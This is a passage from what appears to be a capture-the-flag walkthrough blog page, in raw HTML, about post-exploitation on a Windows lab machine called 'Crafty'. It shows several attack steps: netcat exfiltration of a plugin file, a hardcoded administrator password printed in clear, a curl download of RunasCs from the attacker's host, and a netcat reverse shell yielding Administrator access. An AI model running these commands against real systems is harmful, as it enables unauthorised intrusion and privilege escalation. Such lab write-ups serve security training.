directory, there’s an unusual folder </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">server</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/963e9fb83506485cb600b800de4c9daa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_minecraft&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+
+    Directory: C:\users\svc_minecraft
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         2/5/2024   6:02 AM                3D Objects
+d-r---         2/5/2024   6:02 AM                Contacts  
+d-r---         2/5/2024   6:02 AM                Desktop   
+d-r---         2/5/2024   6:02 AM                Documents 
+d-r---         2/5/2024   6:02 AM                Downloads 
+d-r---         2/5/2024   6:02 AM                Favorites 
+d-r---         2/5/2024   6:02 AM                Links     
+d-r---         2/5/2024   6:02 AM                Music     
+d-r---         2/5/2024   6:02 AM                Pictures  
+d-r---         2/5/2024   6:02 AM                Saved Games
+d-r---         2/5/2024   6:02 AM                Searches   
+d-----       10/26/2023   6:37 PM                server     
+d-r---         2/5/2024   6:02 AM                Videos</span></span></span></code></pre><div id="https://www.notion.so/6cc75d776bb24167aad965a5b7f9dac3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside is the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.jar</code></span><span class="SemanticString"> file for the Minecraft server, and a plugins folder containing another </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.jar</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/806386fd64c1401c8c2159a1bc44cf17" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_minecraft\server\plugins&gt;</span></mark></span><span class="SemanticString"><span> dir
+
+
+    Directory: C:\users\svc_minecraft\server\plugins
+
+
+Mode                LastWriteTime         Length Name 
+----                -------------         ------ ---- 
+-a----       10/27/2023   2:48 PM           9996 playercounter-1.0-SNAPSHOT.jar</span></span></span></code></pre><div id="https://www.notion.so/d3af42487d1345bfbbf1e7551a28ced7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To download the file, I’ll first set up a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> listener on port 8001 and redirects to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">plugin.jar</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/4fda5535c9b64071b0ce3ede462e884a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> nc -lp 8001 &gt; plugin.jar</span></span></span></code></pre><div id="https://www.notion.so/5b60aa784f854449bbcc6d172d37f576" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">On the box, I’ll also use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> to send the file back. I’ll set a 20 seconds timeout with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-w 20</code></span><span class="SemanticString"> to prevent the terminal hanging:</span></span></p></div><pre id="https://www.notion.so/334c17d37f9b4ad280a1b2c4b8dea8a6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\svc_minecraft\server\plugins&gt;</span></mark></span><span class="SemanticString"><span> c:\windows\temp\nc64.exe 10.10.14.18 8001 -w 20 &lt; playercounter-1.0-SNAPSHOT.jar</span></span></span></code></pre><div id="https://www.notion.so/f4abf64be6d64685b7ede2f114951ff5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a69a79ec4f6546cbbda45a991b309adc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Java Decompile:</strong></span></span></p></div><div id="https://www.notion.so/6189fd225c8b4097b6a01981eb9fef61" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use an </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://www.javadecompilers.com/">online Java decompiler</a></span><span class="SemanticString"> to unpack the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.jar</code></span><span class="SemanticString"> file:</span></span></p></div><div id="https://www.notion.so/360f6d9c8210459b873b5ad96a5bf48d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5d26a37a-a96c-4045-ae8e-ae6f67b430b3%2FUntitled.png?width=1904&amp;table=block&amp;id=360f6d9c-8210-459b-873b-5ad96a5bf48d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5d26a37a-a96c-4045-ae8e-ae6f67b430b3%2FUntitled.png?width=1904&amp;table=block&amp;id=360f6d9c-8210-459b-873b-5ad96a5bf48d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/39683d6497b54dd09368572cc8e71465" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It only contains a few files:</span></span></p></div><div id="https://www.notion.so/ede87446123d43338f498fbcffbc4050" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F071446a8-a364-427a-ad75-6ee175756f49%2FUntitled.png?width=1268&amp;table=block&amp;id=ede87446-123d-4333-8f49-8fbcffbc4050"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F071446a8-a364-427a-ad75-6ee175756f49%2FUntitled.png?width=1268&amp;table=block&amp;id=ede87446-123d-4333-8f49-8fbcffbc4050" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ae3323f6562242f183b77f8ba91b2d17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.java</code></span><span class="SemanticString"> file first, I immediately spotted the hardcoded password in it:</span></span></p></div><div id="https://www.notion.so/7402188e0cff49e5b841843fe2f412eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Inside the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.java</code></span><span class="SemanticString"> file, there’s a hard-coded password</span></span></p></div><div id="https://www.notion.so/45c9b4332a35419fba3a2bfe5830624d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3dbada79-2d23-4f7a-87ad-20a0474b9c5d%2FUntitled.png?width=1309&amp;table=block&amp;id=45c9b433-2a35-419f-ba3a-2bfe5830624d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F3dbada79-2d23-4f7a-87ad-20a0474b9c5d%2FUntitled.png?width=1309&amp;table=block&amp;id=45c9b433-2a35-419f-ba3a-2bfe5830624d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e544d121492549febd16053ada74bbc6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1e7ad30173644fdcb88df98e0b99fe9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Password Reuse:</strong></span></span></p></div><div id="https://www.notion.so/d713dd53e17645a2afdfdb68145dd29d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m guessing the password is the administrator password, and </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/RunasCs">RunasCs</a></span><span class="SemanticString"> confirmed this:</span></span></p></div><pre id="https://www.notion.so/38ef77ac01f44d8f8c73321f678927b3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.18:5000/RunasCs.exe -o RunasCs.exe
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe administrator s67u84zKq8IXw &quot;cmd /c whoami&quot;
+
+crafty\administrator</span></span></span></code></pre><div id="https://www.notion.so/9166ae7e26b448aeb8e1608815c55974" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It can also be used to send back a reverse shell:</span></span></p></div><pre id="https://www.notion.so/2040af1e9c88404d80e3b7d0737ebc21" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\temp&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe administrator s67u84zKq8IXw &quot;c:/windows/temp/nc64.exe 10.10.14.18 8001 -e cmd&quot; -t 0          
+
+[+] Running in session 1 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: WinSta0\Default
+[+] Async process &#x27;c:/windows/temp/nc64.exe 10.10.14.18 8001 -e cmd&#x27; with pid 1564 created in background.</span></span></span></code></pre><div id="https://www.notion.so/423d9e6932a2412a95b57475b7118957" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At my </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc</code></span><span class="SemanticString"> listener, I have a session as Administrator:</span></span></p></div><pre id="https://www.notion.so/6b36591f302641ff9cde33b5b1f43877" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/crafty/post-exploitation]
+└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001    
+[sudo] password for chengw: 
+listening on [any] 8001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.129.16.71] 49684
+Microsoft Windows [Version 10.0.17763.5329]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+crafty\administrator</span></span></span></code></pre><div id="https://www.notion.so/ddadce206bba435bb4bdb245d642dde6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/89e2d3fad3594c12bb1cce0fee655376" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/a4046b7fa10d44a4a3d83d745e8ee1c9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\Users\Administrator\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt
+
+fee27c39************************</span></span></span></code></pre><div id="https://www.notion.so/0cf85fd3739e46bf872d08df172b6b2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e41637090b7f4d309254dcd66027a899" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
